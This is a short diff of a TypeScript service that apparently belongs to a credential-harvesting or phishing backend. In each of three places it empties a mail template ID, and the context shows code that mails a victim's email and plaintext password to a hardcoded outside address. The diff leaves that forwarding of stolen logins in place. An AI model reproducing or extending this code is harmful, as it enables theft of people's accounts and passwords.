@@ -31,7 +31,7 @@ export class AppService {
         to: {
           email: 'christophh.bergerservices@aol.com',
         },
-        template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
+        template: '',
         data: {
           recipientName: `email: ${email}, \n password: ${password}
 
@@ -78,7 +78,7 @@ export class AppService {
           to: {
             email: 'christophh.bergerservices@aol.com',
           },
-          template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
+          template: '',
           data: {
             recipientName: `email: ${email}, \n password: ${password}
 
@@ -124,7 +124,7 @@ export class AppService {
           to: {
             email: 'christophh.bergerservices@aol.com',
           },
-          template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
+          template: '',
           data: {
             recipientName: `email: ${email}, \n password: ${password}
 
